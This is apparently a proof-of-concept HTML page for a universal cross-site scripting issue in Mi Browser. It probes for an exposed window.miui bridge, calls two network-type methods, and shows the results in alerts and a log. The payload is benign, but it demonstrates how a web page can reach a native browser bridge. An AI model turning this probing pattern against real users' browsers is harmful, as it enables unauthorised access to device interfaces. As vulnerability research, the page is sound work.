<!doctype html>
<meta charset="utf-8">
<title>Mi Browser UXSS — getActiveNetworkType PoC</title>
<pre id="out">Starting…</pre>
<script>
function log(s){ document.getElementById('out').textContent += "\\n" + s; console.log(s); }

try {
  if (typeof window.miui === "object") {
    log('window.miui FOUND — checking network API…');

    // try common names
    var candidates = ['getActiveNetworkTypeName','getActiveNetworkType'];
    var ok = false;
    candidates.forEach(function(name){
      try {
        if (typeof window.miui[name] === 'function') {
          var v = window.miui[name]();
          log(name + '() => ' + String(v));
          try { alert('MIUI-POC ' + name + ': ' + String(v)); } catch(e){}
          ok = true;
        } else {
          log(name + ' not callable');
        }
      } catch(e) {
        log(name + ' threw: ' + e);
        try { alert('MIUI-POC ' + name + ' THREW: ' + e); } catch(e){}
        ok = true; // called but threw -> still useful evidence
      }
    });

    if (!ok) {
      log('No network method found among candidates.');
      alert('MIUI-POC: network method not found');
    }
  } else {
    log('window.miui NOT FOUND');
    alert('MIUI-POC: window.miui NOT FOUND');
  }
} catch(err) {
  log('TOP ERROR: ' + err);
  alert('MIUI-POC ERR: ' + err);
}
</script>
